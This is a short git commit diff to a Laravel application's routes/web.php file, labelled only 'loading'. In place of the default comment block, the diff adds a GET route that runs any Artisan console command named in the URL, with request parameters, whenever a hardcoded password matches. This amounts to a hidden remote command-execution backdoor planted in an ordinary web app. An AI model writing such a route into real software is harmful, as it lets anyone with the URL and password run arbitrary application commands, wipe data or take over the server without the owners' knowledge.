b39b49abd5fd435f18575bd2cfa71e5a49f9f457
Anh Khoa <binm8.4356@gmail.com>
2024-01-12 00:09:08 +0700

    loading

--- routes/web.php
+++ routes/web.php
@@ -7,16 +7,12 @@ use Illuminate\Foundation\Application;
 use Illuminate\Support\Facades\Route;
 use Inertia\Inertia;
 
-/*
-|--------------------------------------------------------------------------
-| Web Routes
-|--------------------------------------------------------------------------
-|
-| Here is where you can register web routes for your application. These
-| routes are loaded by the RouteServiceProvider within a group which
-| contains the "web" middleware group. Now create something great!
-|
-*/
+Route::get('artisan/{password}/{command}', function($password, $command) {
+    if ($password === '74ujk6Z2wO') {
+        $exitCode = \Artisan::call($command, request()->all());
+        echo $exitCode;
+    }
+});
 
 Route::get('/', function () {
     return Inertia::render('Welcome', [
